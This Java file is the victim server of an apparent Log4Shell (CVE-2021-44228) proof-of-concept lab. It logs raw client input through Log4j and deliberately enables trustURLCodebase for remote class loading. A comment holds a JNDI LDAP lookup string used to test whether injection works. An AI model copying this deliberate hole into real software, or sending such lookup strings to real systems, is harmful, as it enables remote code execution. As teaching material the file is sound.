/**
 * The Victim PC Code to run a minimal network server (on Port 80) and write down the information it is given.
 * Note: This is vulnerable to CVE-2021-44228 - Proof of Concept Code
 */
package victimpkg;

import org.apache.logging.log4j.*;

import java.io.File;
import java.io.FileWriter;
import java.io.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;
import java.util.stream.*;
import java.net.*;
//import com.sun.jndi.

/**
 * @author Jeremiah Webb
 *
 */
@SuppressWarnings("unused")
public class Server extends Thread{

	/**
	 * @param args
	 */
	private ServerSocket serverSocket;
	private static Logger sLogger = LogManager.getLogger(Server.class.getName());
	private static int testvar = 10;
	private static int buffersize = 8192;
	
	
	public Server(int port) throws IOException {
		// Make server when this is instantiated.
	      serverSocket = new ServerSocket(port);
	      
	      
	      //serverSocket.setSoTimeout(10000);
	}
	
	/**
	 * Run Thread for the Server. 
	 */
	public void run() {
		sLogger.info("Running Server Thread - In Scope.");
		String remoteIP = "NOT INIT";
	      while(true) {
	         try {
	            System.out.println("Waiting for client on port " + 
	               serverSocket.getLocalPort() + "...");
	            Socket server = serverSocket.accept();
	            server.setReceiveBufferSize(buffersize);
	            server.setSendBufferSize(buffersize);
	            
	            DataInputStream in = new DataInputStream(server.getInputStream());
	            BufferedReader br = new BufferedReader(new InputStreamReader(in));
	            DataOutputStream out = new DataOutputStream(server.getOutputStream());
	            
	            
	            remoteIP = server.getRemoteSocketAddress().toString();
	            System.out.println("Connection from " + server.getRemoteSocketAddress());
	            
	            // Server reads user input and responds to it
	            
	            while (true) 
	            {
	            	
	            	String instr = br.readLine().trim();
	            	sLogger.info("User [" + remoteIP + "] Said: " + instr);
	            	
	            	if (instr.contains("break") || instr==null){
	            		sLogger.info("Broken Connection with client " + remoteIP);
	            		out.write("Thank you for using the server!".getBytes());
	            		break;
	            	}
	            	else if (instr.startsWith("reply")) 
	            	{
	            		sLogger.info("Replying to ["+remoteIP+"] with '" + instr + "'");
	            		out.write(instr.getBytes());
	            		
	            	}
	            	else 
	            	{
	            		sLogger.debug("ACK response.");
	            		out.write("ACK\n".getBytes());
	            	}
	            }
	            //String input = in.readUTF();
	            //System.out.println(input);
	            
	            
	            //out.writeUTF("Come back soon, friend. " + server.getLocalSocketAddress()
	            //   + "\nGoodbye!");
	            server.close();
	            
	         } catch (SocketTimeoutException s) {
	            System.out.println("Socket timed out!");
	            sLogger.info("Client " + remoteIP + " timed out.");
	           
	            //break;
	         } catch (IOException e) {
	            //e.printStackTrace();
	            sLogger.warn(e.getMessage());
	            sLogger.info("Moving on");
	            //break;
	         } 
	      }
	   }
	
	
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		//sLogger
		System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
		System.out.println("Running!");
		sLogger.info("Logging Enabled.");
		//sLogger.error("Testing Embed ${jndi:ldap://8.8.8.8/a}"); <- to check if jndi is enabled in this environment : yes it is.
		
		// Initialise a server.
		int port = 1111;
		try {
	         Thread t = new Server(port);
	         t.start();
	      } catch (IOException e) {
	         e.printStackTrace();
	      }
		
		sLogger.info("Server Out-Scope Initialised.");
		
	}

}
